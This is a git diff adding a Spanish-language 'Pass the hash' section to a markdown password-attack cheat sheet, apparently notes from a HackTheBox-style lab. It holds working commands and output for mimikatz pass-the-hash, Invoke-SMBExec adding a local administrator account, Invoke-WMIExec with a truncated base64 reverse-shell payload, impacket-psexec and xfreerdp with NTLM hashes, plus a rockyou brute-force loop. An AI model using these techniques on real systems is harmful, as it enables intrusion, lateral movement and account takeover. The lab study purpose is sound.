@@ -134,3 +134,74 @@ tags: [passwordattack]     # TAG names should always be lowercase
 | `bitlocker2john -i Backup.vhd > backup.hashes`               | Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes. |
 | `file GZIP.gzip`                                             | Uses the Linux-based file tool to gather file format information. |
 | `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done` | Script that runs a for-loop to extract files from an archive. |
+
+
+## Pass the hash
+
+Podemos usar un hash NTLM para poder ejecutar comando como el usuario del hash.
+
+```powershell
+c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+user    : julio
+domain  : inlanefreight.htb
+program : cmd.exe
+impers. : no
+NTLM    : 64F12CDDAA88057E06A81B54E73B949B
+  |  PID  8404
+  |  TID  4268
+  |  LSA Process was already R/W
+  |  LUID 0 ; 5218172 (00000000:004f9f7c)
+  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
+  \_ kerberos - data copy @ 0000028FC964F288
+   \_ des_cbc_md4       -> null
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+```
+Con Invoke-TheHash donde podemos utilizar una revserse shell en base64 para poder conectarnos.
+
+```powershell
+PS c:\htb> cd C:\tools\Invoke-TheHash\
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+
+VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
+VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
+VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
+VERBOSE: [*] Trying to execute command on 172.16.1.10
+[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
+VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
+```
+```powershell
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain Administrator -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4 <SNIP>
+```
+Con psexec 
+
+```shell
+$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.129.201.126.....
+[*] Found writable share ADMIN$
+[*] Uploading file SLUBMRXK.exe
+[*] Opening SVCManager on 10.129.201.126.....
+[*] Creating service AdzX on 10.129.201.126.....
+[*] Starting service AdzX.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19044.1415]
+```
+Con rdp 
+
+```shell
+$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+
+[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
+[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
+...snip...
+[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
+[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+...SNIP...
+```
+
